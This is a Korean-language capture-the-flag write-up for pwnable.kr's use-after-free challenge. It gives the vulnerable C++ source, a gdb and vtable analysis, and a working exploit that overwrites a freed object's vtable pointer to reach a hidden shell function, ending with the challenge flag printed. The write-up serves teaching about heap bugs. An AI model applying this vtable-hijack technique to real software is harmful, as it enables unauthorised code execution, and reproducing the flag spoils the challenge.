# 문제
Mommy, what is Use After Free bug?

ssh uaf@pwnable.kr -p2222 (pw:guest)

---
# 개요
```
uaf@ubuntu:~$ ls
flag  uaf  uaf.cpp
```
```cpp
#include <fcntl.h>
#include <iostream>
#include <cstring>
#include <cstdlib>
#include <unistd.h>
using namespace std;

class Human{
private:
	virtual void give_shell(){
		system("/bin/sh");
	}
protected:
	int age;
	string name;
public:
	virtual void introduce(){
		cout << "My name is " << name << endl;
		cout << "I am " << age << " years old" << endl;
	}
};

class Man: public Human{
public:
	Man(string name, int age){
		this->name = name;
		this->age = age;
        }
        virtual void introduce(){
		Human::introduce();
                cout << "I am a nice guy!" << endl;
        }
};

class Woman: public Human{
public:
        Woman(string name, int age){
                this->name = name;
                this->age = age;
        }
        virtual void introduce(){
                Human::introduce();
                cout << "I am a cute girl!" << endl;
        }
};

int main(int argc, char* argv[]){
	Human* m = new Man("Jack", 25);
	Human* w = new Woman("Jill", 21);

	size_t len;
	char* data;
	unsigned int op;
	while(1){
		cout << "1. use\n2. after\n3. free\n";
		cin >> op;

		switch(op){
			case 1:
				m->introduce();
				w->introduce();
				break;
			case 2:
				len = atoi(argv[1]);
				data = new char[len];
				read(open(argv[2], O_RDONLY), data, len);
				cout << "your data is allocated" << endl;
				break;
			case 3:
				delete m;
				delete w;
				break;
			default:
				break;
		}
	}

	return 0;
}
```
User After Free(UAF)는 Heap 영역에서 발생하는 취약점입니다. 운영체제는 최적화를 위해 힙영역에 할당하고 해제한 영역을 flag bit만 설정해둔 뒤 그 영역의 메모리 데이터를 그대로 남겨 놓습니다. 이 취약점은 해제한 힙 영역을 재사용함으로써 문제가 발생합니다. 특히 객체지향언어인 C++, Java에서 많이 발생하는 취약점이나 최근에는 개발자의 실수로 리얼월드에서 많이 발생하는 취약점 입니다.
UAF 취약점 발생 조건은 아래와 같습니다.
* 동적 메모리 할당
* 메모리 해제
* 힙 영역에 다시 메모리 할당
---
# 분석
소스코드를 먼저 분석해봅시다.
```cpp
class Human{
private:
	virtual void give_shell(){
		system("/bin/sh");
	}
protected:
	int age;
	string name;
public:
	virtual void introduce(){
		cout << "My name is " << name << endl;
		cout << "I am " << age << " years old" << endl;
	}
};
```
Man 과 Woman은 Human으로부터 상속됩니다. 즉 Man과 Woman은 우리가 불러내야할 함수인 give_shell 함수를 갖고 있는 것입니다.
```cpp
case 1:
  m->introduce();
  w->introduce();
  break;
```
1번을 눌러 위의 introduce를 불러낼 수 있는 것을 알 수 있습니다. introduce 함수 주소에 give_shell 주소를 넣어 공격을 시도할 것입니다.
```
0x0000000000400fc3 <+255>:	cmp    eax,0x1
0x0000000000400fc6 <+258>:	je     0x400fcd <main+265>
0x0000000000400fc8 <+260>:	jmp    0x4010a9 <main+485>
0x0000000000400fcd <+265>:	mov    rax,QWORD PTR [rbp-0x38]
0x0000000000400fd1 <+269>:	mov    rax,QWORD PTR [rax]
0x0000000000400fd4 <+272>:	add    rax,0x8
0x0000000000400fd8 <+276>:	mov    rdx,QWORD PTR [rax]
0x0000000000400fdb <+279>:	mov    rax,QWORD PTR [rbp-0x38]
0x0000000000400fdf <+283>:	mov    rdi,rax
0x0000000000400fe2 <+286>:	call   rdx
```
gdb를 사용하여 main함수 내에 있는 case 1: intrduce를 불러내는 코드입니다. breakpoint를 걸고 어떻게 부르는지 알아볼 필요가 있습니다.
```
0x0000000000400fd1 in main ()
(gdb) x/i$rip
=> 0x400fd1 <main+269>:	mov    rax,QWORD PTR [rax]
(gdb) ni
0x0000000000400fd4 in main ()
(gdb) x/i $rip
=> 0x400fd4 <main+272>:	add    rax,0x8
```
rax-0x38에서 값을 가져와 rax에 넣습니다.
그리고 rax 주소에 있는 값을 가져와 8을 더하고 함수를 호출합니다.
여기서 rax의 주소는 0x401570입니다.
```
(gdb) x/30x 0x401570
0x401570 <_ZTV3Man+16>:	0x0040117a	0x00000000	0x004012d2	0x00000000
0x401580 <_ZTV5Human>:	0x00000000	0x00000000	0x004015f0	0x00000000
0x401590 <_ZTV5Human+16>:	0x0040117a	0x00000000	0x00401192	0x00000000
0x4015a0 <_ZTS5Woman>:	0x6d6f5735	0x00006e61	0x00000000	0x00000000
0x4015b0 <_ZTI5Woman>:	0x00602390	0x00000000	0x004015a0	0x00000000
0x4015c0 <_ZTI5Woman+16>:	0x004015f0	0x00000000	0x6e614d33	0x00000000
0x4015d0 <_ZTI3Man>:	0x00602390	0x00000000	0x004015c8	0x00000000
0x4015e0 <_ZTI3Man+16>:	0x004015f0	0x00000000
```
0x401570에서 8을 더한 위치는 0x4012d2입니다.
```
(gdb) x/30x 0x4012d2
0x4012d2 <_ZN3Man9introduceEv>:	0xe5894855	0x10ec8348	0xf87d8948	0xf8458b48
0x4012e2 <_ZN3Man9introduceEv+16>:	0xe8c78948	0xfffffea8	0x4014cdbe	0x2260bf00
0x4012f2 <_ZN3Man9introduceEv+32>:	0xf7e80060	0xbefffff9	0x00400d60	0xe8c78948
0x401302 <_ZN3Man9introduceEv+48>:	0xfffffa4a	0x4855c3c9	0x4853e589	0x4828ec83
0x401312 <_ZN5WomanC2ESsi+10>:	0x48e87d89	0x89e07589	0x8b48dc55	0x8948e845
0x401322 <_ZN5WomanC2ESsi+26>:	0xfee8e8c7	0x8b48ffff	0xc748e845	0x40155000
0x401332 <_ZN5WomanC2ESsi+42>:	0x458b4800	0x508d48e8	0x458b4810	0xc68948e0
0x401342 <_ZN5WomanC2ESsi+58>:	0xe8d78948	0xfffffa66
```
introduce가 보이는 것을 알 수 있습니다. 이제 -8 에 위치한 0x0040117a를 확인합니다.
```
(gdb) x/30x 0x0040117a
0x40117a <_ZN5Human10give_shellEv>:	0xe5894855	0x10ec8348	0xf87d8948	0x4014a8bf
0x40118a <_ZN5Human10give_shellEv+16>:	0xfb30e800	0xc3c9ffff	0xe5894855	0xec834853
0x40119a <_ZN5Human9introduceEv+8>:	0x7d894818	0x458b48e8	0x588d48e8	0x14b0be10
0x4011aa <_ZN5Human9introduceEv+24>:	0x60bf0040	0xe8006022	0xfffffb3a	0x48de8948
0x4011ba <_ZN5Human9introduceEv+40>:	0x6fe8c789	0xbefffffb	0x00400d60	0xe8c78948
0x4011ca <_ZN5Human9introduceEv+56>:	0xfffffb82	0xe8458b48	0xbe08588b	0x004014bc
0x4011da <_ZN5Human9introduceEv+72>:	0x602260bf	0xfb0ce800	0xde89ffff	0xe8c78948
0x4011ea <_ZN5Human9introduceEv+88>:	0xfffffa72	0x4014c2be
```
give_shell 함수의 주소가 보입니다.
분석한 내용을 바탕으로 정리를 해보면 아래와 같습니다.
* rbp-0x38 의 주소 = 0x00614c50
* rbp-0x38에서 가져온 값 = 0x401570
* 이 값이 가져와서 8을 더한 값

UAF의 특성과 분석한 내용을 바탕으로 공격을 시도합니다.
```
uaf@ubuntu:~$ cd /tmp
uaf@ubuntu:/tmp$ python -c 'print "\x68\x15\x40\x00"' > secretpack
uaf@ubuntu:/tmp$
```
먼저 tmp 디렉터리로 이동하여 0x401570-8을 파일에 넣어둡니다.
```
uaf@ubuntu:/tmp$ /home/uaf/uaf 4 secretpack
1. use
2. after
3. free
3
1. use
2. after
3. free
2
your data is allocated
1. use
2. after
3. free
2
your data is allocated
1. use
2. after
3. free
1
$ id
uid=1029(uaf) gid=1029(uaf) egid=1030(uaf_pwn) groups=1030(uaf_pwn),1029(uaf)
$ cat /home/uaf/flag
yay_f1ag_aft3r_pwning
$
```
